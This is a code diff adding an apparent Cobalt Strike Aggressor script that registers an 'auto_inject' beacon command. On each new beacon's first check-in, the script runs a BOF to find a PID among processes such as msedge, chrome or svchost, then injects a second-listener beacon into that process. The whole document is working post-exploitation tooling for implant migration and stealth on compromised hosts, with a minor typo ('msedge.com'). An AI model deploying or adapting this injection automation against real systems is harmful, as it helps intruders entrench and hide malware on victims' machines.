@@ -1,0 +1,74 @@
+beacon_command_register(
+	"auto_inject.cna", "Specify max 4 processes to inject into, will search in order untill a matching process is found.",
+	"INFO:\nThe program follows a specific order of processes specified in the .cna file or read from arguments and attempts to inject into them. Once a valid PID is identified, the injection occurs once. To avoid injection loops, the program utilizes an initial listener and a secondary one for the injection process. Auto-inject into a process as specified by the user. Will run through the order. NOTE: This will use the same injection method as the \"inject\" command. \n\n" .
+   "USAGE:\nauto_inject <proc1> <proc2> <proc3> <proc4>\n\n" .
+	"EXAMPLE:\nauto_inject msedge.exe chrome.exe svchost.exe\n\n");
+
+alias auto_inject{      
+      $bid = $1;
+      # order of processes to try to inject
+      $first = $2;
+      $second = $3;
+      $third = $4;
+      $fourth = $5;
+
+      # Get PID of process to inject into.
+      $handle = openf(script_resource("auto_inject.o"));
+      $data = readb($handle, -1);
+      closef($handle);
+      # pack arguments & execute BOF.
+      $arg_data = bof_pack($bid, "zzzz", $first, $second, $third, $fourth);
+      beacon_inline_execute($1, $data, "go", $arg_data);  
+}
+
+$injected = 0;
+@beacon_array = @();
+
+on beacon_initial {
+   #Check if beacon checked-in before e.g. User removes from GUI but beacon did not exit
+   foreach $beacon (@beacon_array){
+      if ($beacon eq $1){
+         btask($1, "Beacon checked in before, skipping inject...");
+         exit();
+      }
+   }
+   add(@beacon_array, $1, 0);
+   #SET THESE VALUES
+   $primary_listener = "http";      # listener for initial payload
+   $secondary_listener = "http2";   # listener to inject
+   $listener = beacon_info($1,'listener');
+   # check if 'initial' listener
+   if ($listener eq $primary_listener){
+      # execute the bof and hardcoded processes for initial beacon (max 4)
+      fireAlias($1, "auto_inject", "notepad.exe msedge.com chrome.exe svchost.exe");
+      on beacon_output {
+            $prefix = "";
+            # parse BOF output
+            $beacon = $1;
+            $message = $2;
+            $splits = split('\t', $message);
+            $prefix = $splits[1];
+            $procname = $splits[2];
+            $pid = $splits[3];
+
+            #check arch
+            if (-is64 $1){$arch = "x64";}else{$arch = "x86";}
+
+            # if no inject took place yet, inject..
+            if ($injected eq "0"){      
+
+            # check if output is result of BOF by prefix
+               if($prefix eq "INIT_PID_SEARCH"){
+                  
+                  btask($1, "Injecting into listener: $secondary_listener with PID: $pid $arch $prefix");
+                  binject($1, $pid, $secondary_listener, $arch);
+                  # increment to prevent injections for each beacon
+                  $injected++;
+            }
+            }
+         }
+                 
+         }
+   # reset for next beacon(s)
+   $injected = 0;
+}
